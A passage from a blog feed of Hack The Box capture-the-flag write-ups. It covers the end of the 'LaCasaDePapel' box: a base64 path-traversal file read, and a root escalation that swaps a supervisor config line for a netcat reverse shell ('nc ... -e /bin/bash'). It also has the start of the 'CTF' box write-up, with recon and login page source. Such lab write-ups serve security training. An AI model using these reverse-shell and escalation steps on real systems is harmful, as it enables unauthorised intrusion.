&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n &quot;../user.txt&quot; | base64
Li4vdXNlci50eHQ=
root@kali:~/Desktop/HTB/boxes/lacasadepapel# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lacasadepapel/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;privilege-escalation-root-flag&quot;&gt;Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-professor-there-are-2-interesting-files--memcachedini-and-memcachedjs-&quot;&gt;In the home directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;professor&lt;/code&gt; there are 2 interesting files : &lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.ini&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.js&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lacasadepapel [~]$ ls -la
total 24
drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .
drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -&amp;gt; /dev/null
drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
lacasadepapel [~]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-cant-read-memcachedjs-but-we-can-read-memecachedini-we-cant-write-to-both&quot;&gt;We can’t read &lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.js&lt;/code&gt; but we can read &lt;code class=&quot;highlighter-rouge&quot;&gt;memecached.ini&lt;/code&gt;, we can’t write to both.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lacasadepapel [~]$ cat memcached.js 
cat: can't open 'memcached.js': Permission denied
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;memcachedini-is-executing-this-command--usrbinnode-homeprofessormemcachedjs-as-nobody-by-using-sudo-most-likely-it-will-be-running-as-root-i-ran-pspy-and-saw-that-the-command-gets-executed-periodically-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.ini&lt;/code&gt; is executing this command : &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/node /home/professor/memcached.js&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;nobody&lt;/code&gt; by using &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt;. Most likely it will be running as root, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt; and saw that the command gets executed periodically :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-uid-is-65534-which-is-the-uid-of-nobody-&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; is 65534 which is the &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; of &lt;code class=&quot;highlighter-rouge&quot;&gt;nobody&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lacasadepapel [~]$ id nobody
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
lacasadepapel [~]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-cant-write-to-memcachedini-but-we-can-delete-it-and-create-a-new-one-&quot;&gt;We can’t write to &lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.ini&lt;/code&gt;, but we can delete it and create a new one :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ rm memcached.ini
rm: remove 'memcached.ini'? y
lacasadepapel [~]$ vi memcached.ini
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = /usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash
lacasadepapel [~]$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-changed-the-command-from-sudo--u-nobody-usrbinnode-homeprofessormemcachedjs-to-usrbinnc-1010xxxx-1337--e-binbash-after-some-seconds-i-got-a-reverse-shell-as-root-&quot;&gt;I changed the command from &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -u nobody /usr/bin/node /home/professor/memcached.js&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash&lt;/code&gt;. After some seconds I got a reverse shell as root :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasadepapel/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---ctf&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ctf/&quot;&gt;Hack The Box - CTF&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---fortune&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/fortune/&quot;&gt;Hack The Box - Fortune&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="ssh" /><category term="php" /><summary type="html">Quick Summary Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is 10.10.10.131, I added it to /etc/hosts as lacasadepapel.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lacasadepapel.htb We have http on port 80. https on port 443, ftp on port 21 and ssh on port 22. Anonymous authentication wasn’t allowed on ftp so I checked http and https : root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb Connected to lacasadepapel.htb. 220 (vsFTPd 2.3.4) Name (lacasadepapel.htb:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp&amp;gt; HTTP http://lacasadepapel.htb We see an image of the characters from LaCasaDePapel (TV show) and a QR code for OTP, I scanned it with Google Authenticator on my phone : As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the OTP and used test@test.com as email : Then nothing happened, I just got the same page back again. I tried gobuster to see if I can find any sub directories and I didn’t get anything useful. Let’s check https. https://lacasadepapel.htb The same background with an error message saying : “Sorry, but you need to provide a client certificate to continue.” vsftpd 2.3.4, Psy Shell After hitting dead ends with web, I checked the ftp service again, the version was vsftpd 2.3.4 (from the nmap scan) so I searched for exploits : root@kali:~/Desktop/HTB/boxes/lacasadepapel# searchsploit vsftpd 2.3.4 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | exploits/unix/remote/17491.rb -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Command Execution and there is a metasploit module for it, but the exploit didn’t work : ``` msf5 &amp;gt; search vsftpd 2.3.4</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/lacasadepapel/0.png" /></entry><entry><title type="html">Hack The Box - CTF</title><link href="http://localhost:4000/hack-the-box/ctf/" rel="alternate" type="text/html" title="Hack The Box - CTF" /><published>2019-07-20T00:00:00+02:00</published><updated>2019-07-20T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/ctf</id><content type="html" xml:base="http://localhost:4000/hack-the-box/ctf/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-ctf-retired-and-heres-my-write-up-about-it-ctf-was-a-very-cool-box-it-had-an-ldap-injection-vulnerability-which-i-have-never-seen-on-another-box-before-and-the-way-of-exploiting-that-vulnerability-to-gain-access-was-great-a-really-unique-box-i-had-fun-solving-it-and-i-hope-you-have-fun-too-reading-my-write-up-its-a-linux-box-and-its-ip-is-101010122-i-added-it-to-etchosts-as-ctfhtb-lets-jump-right-in-&quot;&gt;Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.122&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;ctf.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC ctf.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ctf/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;only-http-on-port-80-and-ssh-on-port-22&quot;&gt;Only &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://ctf.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ctf/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-pretty-straightforward-that-we-will-get-banned-for-5-minutes-if-we-tried-to-bruteforce-anything-like-sub-directories-for-example-its-also-saying-that-they-handle-authentication-with-tokens-theres-a-login-page-so-lets-take-a-look-at-it&quot;&gt;It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-a-username-and-an-otp-one-time-password-an-otp-is-time-limited-which-means-that-even-if-we-could-get-a-valid-one-it-will-give-us-access-only-once-because-it-expires-in-a-short-time-usually-60-seconds-so-we-need-to-gain-access-to-a-place-that-generates-valid-otps-or-to-be-able-to-generate-valid-otps-ourselves-lets-take-a-look-at-the-source-code-of-the-login-page-maybe-something-is-there-&quot;&gt;We need a username and an &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; (one-time password). An &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s or to be able to generate valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s ourselves. Let’s take a look at the source code of the login page, maybe something is there :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;description&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;author&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/favicon.ico&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CTF login form&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Bootstrap core CSS --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/dist/css/bootstrap.min.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Custom styles for this template --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cover.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;header&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;masthead mb-auto&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inner&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;masthead-brand&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;CTF&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;nav&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav nav-masthead justify-content-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav-link active&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav-link active&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;login.php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/nav&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/header&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/login.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsername&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-2 col-form-label&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Username&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsename&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsername&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-2 col-form-label&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;OTP&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;OTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;One Time Password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;btn btn-primary  name=&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
